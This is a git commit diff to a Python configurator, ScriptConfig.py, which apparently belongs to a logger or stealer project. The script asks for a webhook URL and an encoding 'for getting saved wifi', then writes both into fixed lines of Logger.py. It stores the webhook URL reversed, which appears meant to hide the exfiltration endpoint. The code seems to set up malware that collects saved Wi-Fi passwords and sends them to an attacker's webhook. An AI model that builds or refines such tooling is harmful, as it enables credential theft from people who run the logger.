342ec12126026a8193cf37e4617086b6fcfb94c5
TurtlesXD <116833814+TurtlesXD@users.noreply.github.com>
2023-09-20 19:02:57 +0100

    Update ScriptConfig.py

--- ScriptConfig.py
+++ ScriptConfig.py
@@ -1,23 +1,24 @@
-
-
 file_path = 'Logger.py'
-url = input('Your webhook url here: ')
-
-
-changedline=f'webhookurl="{url}"'
+url = input('Your webhook URL here: ')
+encoding = input('Input preferred encoding for getting saved wifi. Leave empty for utf-8 (the standard): ')
+if encoding == '':
+    encoding = 'utf-8'
 
 # Read the content of the file
 with open(file_path, 'r') as file:
     lines = file.readlines()
 
-# Check if there are at least 32 lines in the file
-if len(lines) >= 34:
-    # Modify line 32 with the new content
-    lines[33] = changedline + '\n'
+# Check if there are at least 36 lines in the file
+if len(lines) >= 36:
+    # Modify line 35 with the new content
+    lines[34] = f'webhookurl="{url[::-1]}"\n'  # line 35
+
+    # Modify line 36 with the encoding information
+    lines[35] = f'wifiencoding="{encoding}"\n'  # line 36
 
     # Write the updated content back to the file
     with open(file_path, 'w') as file:
         file.writelines(lines)
-    print("Line is updated")
+    print("Lines are updated")
 else:
-    print("The file does not have at least 32 lines.")
+    print("The file does not have at least 36 lines.")
